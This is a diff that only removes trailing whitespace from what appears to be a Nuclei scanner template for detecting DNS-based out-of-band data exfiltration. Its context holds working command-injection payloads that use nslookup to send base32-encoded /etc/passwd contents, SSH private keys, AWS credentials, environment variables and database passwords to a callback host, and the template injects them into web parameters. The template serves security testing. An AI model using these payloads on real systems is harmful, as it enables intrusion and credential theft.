@@ -2,7 +2,7 @@ id: dns-data-exfiltration-base32-oob
 
 info:
   name: DNS Data Exfiltration with Base32 Encoding OOB
-  author: geeknik  
+  author: geeknik
   severity: high
   description: |
     Detects vulnerabilities that allow data exfiltration through DNS queries using
@@ -26,34 +26,34 @@ variables:
   test_data: "SECRET_DATA_{{randstr}}"
   dns_exfil_payload: |
     # Linux/Unix DNS exfiltration payloads with Base32 encoding
-    
+
     # Basic command execution with DNS exfiltration
     $(nslookup "$(echo '{{test_data}}' | base32 | tr -d '=' | head -c 20).start.{{callback_url}}")
-    
+
     # File content exfiltration
     $(nslookup "$(cat /etc/passwd | base32 | tr -d '=' | head -c 30).passwd.{{callback_url}}")
-    
-    # Environment variable exfiltration  
+
+    # Environment variable exfiltration
     $(nslookup "$(env | base32 | tr -d '=' | head -c 25).env.{{callback_url}}")
-    
+
     # Current user and working directory
     $(nslookup "$(whoami | base32).$(pwd | base32 | head -c 15).user.{{callback_url}}")
-    
+
     # Network interface information
     $(nslookup "$(ifconfig | base32 | head -c 20).network.{{callback_url}}")
-    
+
     # Process list exfiltration
     $(nslookup "$(ps aux | base32 | head -c 30).processes.{{callback_url}}")
-    
+
     # SSH keys exfiltration
     $(nslookup "$(cat ~/.ssh/id_rsa 2>/dev/null | base32 | head -c 40).sshkey.{{callback_url}}")
-    
+
     # Database connection strings
     $(nslookup "$(grep -r "password" /var/www/ 2>/dev/null | base32 | head -c 35).dbpass.{{callback_url}}")
-    
+
     # AWS credentials exfiltration
     $(nslookup "$(cat ~/.aws/credentials 2>/dev/null | base32 | head -c 45).aws.{{callback_url}}")
-    
+
     # Docker secrets
     $(nslookup "$(find /var/lib/docker -name "*.json" -exec cat {} \; 2>/dev/null | base32 | head -c 30).docker.{{callback_url}}")
 
@@ -71,7 +71,7 @@ http:
     payloads:
       param:
         - "q"
-        - "search" 
+        - "search"
         - "query"
         - "filter"
         - "cmd"
@@ -104,7 +104,7 @@ http:
         - "q"
         - "query"
         - "search"
-        - "cmd" 
+        - "cmd"
         - "command"
         - "eval"
         - "expression"
@@ -167,7 +167,7 @@ http:
         "context": "$(nslookup $(date | base32).timestamp.{{callback_url}})"
       }
 
-  - method: POST  
+  - method: POST
     path:
       - "{{BaseURL}}/email"
       - "{{BaseURL}}/contact"
@@ -213,7 +213,7 @@ http:
         part: interactsh_request
         words:
           - ".start."
-          - ".passwd."  
+          - ".passwd."
           - ".env."
           - ".user."
           - ".network."
